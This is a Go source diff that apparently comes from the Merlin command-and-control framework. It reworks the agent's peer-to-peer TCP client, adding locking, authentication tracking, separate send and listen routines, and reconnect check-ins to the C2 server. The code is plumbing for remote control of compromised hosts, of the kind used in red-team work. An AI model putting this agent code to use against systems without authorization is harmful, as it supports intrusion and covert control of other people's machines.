@@ -29,6 +29,7 @@ import (
 	"net"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	// 3rd Party
@@ -58,6 +59,7 @@ const (
 type Client struct {
 	address       string                       // address is the network interface and port the agent will bind to
 	agentID       uuid.UUID                    // agentID the Agent's UUID
+	authenticated bool                         // authenticated tracks if the Agent has successfully authenticated
 	authenticator authenticators.Authenticator // authenticator the method the Agent will use to authenticate to the server
 	connection    net.Conn                     // connection the network socket connection used to handle traffic
 	listener      net.Listener                 // listener the network socket connection listening for traffic
@@ -67,6 +69,7 @@ type Client struct {
 	secret        []byte                       // secret the key used to encrypt messages
 	transformers  []transformer.Transformer    // Transformers an ordered list of transforms (encoding/encryption) to apply when constructing a message
 	mode          int                          // mode the type of client or communication mode (e.g., BIND or REVERSE)
+	sync.Mutex                                 // used to lock the Client when changes are being made by one function or routine
 }
 
 // Config is a structure that is used to pass in all necessary information to instantiate a new Client
@@ -83,7 +86,7 @@ type Config struct {
 
 // New instantiates and returns a Client that is constructed from the passed in Config
 func New(config Config) (*Client, error) {
-	cli.Message(cli.DEBUG, "Entering into clients.p2p.tcp.New()...")
+	cli.Message(cli.DEBUG, "Entering into client/tcp.New()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Config: %+v", config))
 	client := Client{}
 	if config.AgentID == uuid.Nil {
@@ -177,7 +180,7 @@ func New(config Config) (*Client, error) {
 
 // Initial executes the specific steps required to establish a connection with the C2 server and checkin or register an agent
 func (client *Client) Initial() error {
-	cli.Message(cli.DEBUG, "Entering clients.p2p.tcp.Initial function")
+	cli.Message(cli.DEBUG, "Entering client/tcp.Initial function")
 
 	err := client.Connect()
 	if err != nil {
@@ -207,6 +210,7 @@ func (client *Client) Authenticate(msg messages.Base) (err error) {
 
 		// Once authenticated, update the client's secret used to encrypt messages
 		if authenticated {
+			client.authenticated = true
 			var key []byte
 			key, err = client.authenticator.Secret()
 			if err != nil {
@@ -218,18 +222,25 @@ func (client *Client) Authenticate(msg messages.Base) (err error) {
 			}
 		}
 
-		// The "none" authenticator will return an empty Base message while an OPAQUE message will return type OPAQUE 2
-		if msg.Type != 0 {
+		if msg.Type == messages.OPAQUE {
 			// Send the message to the server
 			var msgs []messages.Base
-			msgs, err = client.Send(msg)
+			msgs, err = client.SendAndWait(msg)
 			if err != nil {
 				return
 			}
 
 			// Add response message to the next loop iteration
 			if len(msgs) > 0 {
-				msg = msgs[0]
+				// Don't add IDLE messages, just continue on
+				if msgs[0].Type != messages.IDLE {
+					msg = msgs[0]
+				}
+			}
+		} else {
+			_, err = client.Send(msg)
+			if err != nil {
+				return
 			}
 		}
 
@@ -242,6 +253,12 @@ func (client *Client) Authenticate(msg messages.Base) (err error) {
 
 // Connect establish a connection with the remote host depending on the Client's type (e.g., BIND or REVERSE)
 func (client *Client) Connect() (err error) {
+	client.Lock()
+	defer client.Unlock()
+	// Check to see if the connection was restored by a different call stack
+	if client.connection != nil {
+		return nil
+	}
 	switch client.mode {
 	case BIND:
 		if client.listener == nil {
@@ -259,7 +276,11 @@ func (client *Client) Connect() (err error) {
 			return fmt.Errorf("clients/tcp.Connect(): there was an error accepting the connection: %s", err)
 		}
 		cli.Message(cli.NOTE, fmt.Sprintf("Received new connection from %s", client.connection.RemoteAddr()))
-		return nil
+		// Send gratuitous checkin to provide parent Agent with linked agent data
+		if client.authenticated {
+			_, err = client.Send(messages.Base{ID: client.agentID, Type: messages.CHECKIN})
+		}
+		return err
 	case REVERSE:
 		client.connection, err = net.Dial("tcp", client.address)
 		if err != nil {
@@ -315,11 +336,52 @@ func (client *Client) Deconstruct(data []byte) (messages.Base, error) {
 	return messages.Base{}, fmt.Errorf("clients/tcp.Deconstruct(): unable to transform data into messages.Base structure")
 }
 
-// Send takes in a Merlin message structure, performs any encoding or encryption, converts it to a delegate and writes it to the output stream
-// The function also decodes and decrypts response messages and return a Merlin message structure.
-// This is where the client's logic is for communicating with the server.
+// Listen waits for incoming data on an established TCP connection, deconstructs the data into a Base messages, and returns them
+func (client *Client) Listen() (returnMessages []messages.Base, err error) {
+	cli.Message(cli.DEBUG, "clients/tcp.Listen(): entering into function")
+	// Repair broken connections
+	if client.connection == nil {
+		cli.Message(cli.NOTE, fmt.Sprintf("Client connection was empty. Waiting for an incoming connection..."))
+		err = client.Connect()
+		if err != nil {
+			err = fmt.Errorf("clients/tcp.Listen(): %s", err)
+			return
+		}
+	}
+
+	// Wait for the response
+	cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming messages from %s at %s...", client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
+
+	var n int
+	respData := make([]byte, 500000)
+
+	n, err = client.connection.Read(respData)
+	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from connection %s at %s", n, client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
+	if err != nil {
+		if err == io.EOF {
+			err = fmt.Errorf("received EOF from %s, the Agent's connection has been reset", client.connection.RemoteAddr())
+			client.connection = nil
+			return
+		}
+		err = fmt.Errorf("there was an error reading the message from the connection with %s: %s", client.connection.RemoteAddr(), err)
+		return
+	}
+
+	var msg messages.Base
+	msg, err = client.Deconstruct(respData[:n])
+	if err != nil {
+		err = fmt.Errorf("clients/tcp.Listen(): there was an error deconstructing the data: %s", err)
+		return
+	}
+
+	returnMessages = append(returnMessages, msg)
+	return
+}
+
+// Send takes in a Merlin message structure, performs any encoding or encryption, converts it to a delegate and writes it to the output stream.
+// This function DOES not wait or listen for response messages.
 func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err error) {
-	cli.Message(cli.DEBUG, "Entering into clients.p2p.tcp.Send()")
+	cli.Message(cli.DEBUG, "Entering into client/tcp.Send()")
 
 	// Set the message padding
 	if client.paddingMax > 0 {
@@ -369,38 +431,28 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 
 	cli.Message(cli.DEBUG, fmt.Sprintf("Wrote %d bytes to connection %s", n, client.connection.RemoteAddr()))
 
-	// Wait for the response
-	cli.Message(cli.NOTE, fmt.Sprintf("Waiting for response from %s at %s...", client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
-
-	respData := make([]byte, 500000)
-
-	n, err = client.connection.Read(respData)
-	cli.Message(cli.DEBUG, fmt.Sprintf("Read %d bytes from connection %s at %s", n, client.connection.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
-	if err != nil {
-		if err == io.EOF {
-			err = fmt.Errorf("received EOF from %s, the Agent's connection has been reset", client.connection.RemoteAddr())
-			client.connection = nil
-			return
-		}
-		err = fmt.Errorf("there was an error reading the message from the connection with %s: %s", client.connection.RemoteAddr(), err)
-		return
-	}
-
-	var msg messages.Base
-	msg, err = client.Deconstruct(respData[:n])
-	if err != nil {
-		err = fmt.Errorf("clients/tcp.Send(): there was an error deconstructing the data: %s", err)
-		return
-	}
-
-	//fmt.Printf("Received message: %+v\n", msg)
-	returnMessages = append(returnMessages, msg)
 	return
+}
+
+// SendAndWait takes in a Merlin message, encodes/encrypts it, and writes it to the output stream and then waits for response
+// messages and returns them
+func (client *Client) SendAndWait(m messages.Base) (returnMessages []messages.Base, err error) {
+	cli.Message(cli.DEBUG, "Entering into clients/tcp.SendAndWait()...")
+
+	// Send
+	returnMessages, err = client.Send(m)
+	if err != nil {
+		err = fmt.Errorf("clients/tcp.SendAndWait(): %s", err)
+		return
+	}
+
+	// Listen
+	return client.Listen()
 }
 
 // Get is a generic function that is used to retrieve the value of a Client's field
 func (client *Client) Get(key string) string {
-	cli.Message(cli.DEBUG, "Entering into clients.p2p.tcp.Get()...")
+	cli.Message(cli.DEBUG, "Entering into clients/tcp.Get()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s", key))
 	switch strings.ToLower(key) {
 	case "paddingmax":
@@ -414,11 +466,17 @@ func (client *Client) Get(key string) string {
 
 // Set is a generic function that is used to modify a Client's field values
 func (client *Client) Set(key string, value string) error {
-	cli.Message(cli.DEBUG, "Entering into clients.tcp.Set()...")
+	cli.Message(cli.DEBUG, "Entering into clients/tcp.Set()...")
 	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
 	var err error
 	switch strings.ToLower(key) {
-
+	case "listener":
+		var id uuid.UUID
+		id, err = uuid.FromString(value)
+		if err != nil {
+			return fmt.Errorf("clients/tcp.Set(): %s", err)
+		}
+		client.listenerID = id
 	case "paddingmax":
 		client.paddingMax, err = strconv.Atoi(value)
 	case "secret":
@@ -438,5 +496,18 @@ func (client *Client) String() string {
 		return "tcp-reverse"
 	default:
 		return "tcp-unhandled"
+	}
+}
+
+// Synchronous identifies if the client connection is synchronous or asynchronous, used to determine how and when messages
+// can be sent/received.
+func (client *Client) Synchronous() bool {
+	switch client.mode {
+	case BIND:
+		return true
+	case REVERSE:
+		return true
+	default:
+		return false
 	}
 }
